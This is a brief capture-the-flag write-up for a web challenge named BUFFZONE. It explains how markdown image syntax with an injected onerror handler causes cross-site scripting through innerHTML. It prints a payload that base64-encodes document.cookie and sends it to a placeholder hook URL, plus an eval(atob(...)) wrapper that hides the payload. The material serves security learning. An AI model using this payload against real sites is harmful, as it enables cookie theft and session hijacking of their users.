# BUFFZONE (Web Exploitation)

### The Vulnerability:

1. User enters text, which is then parsed through a markdown parser.
2. URLs are replaceable with clickable links.
3. Parsed content is displayed using `innerHTML`.

### The Exploit:

Markdown allows users to add images using the format:
```
![catshttps://onerror=alert(1)//]()
```
When image fails to load, onerror is triggered.

### Payload:

```js
window.open(`{HOOK_URL}?x=${btoa(document.cookie)}`);
```

Cookie is retrieved using this payload.

```
**![catshttps://onerror=eval(atob('d2l=='))//]()**
```

Passing our js payload to this decrypts the payload and executes it, thereby fetching the cookie. Hence, flag.
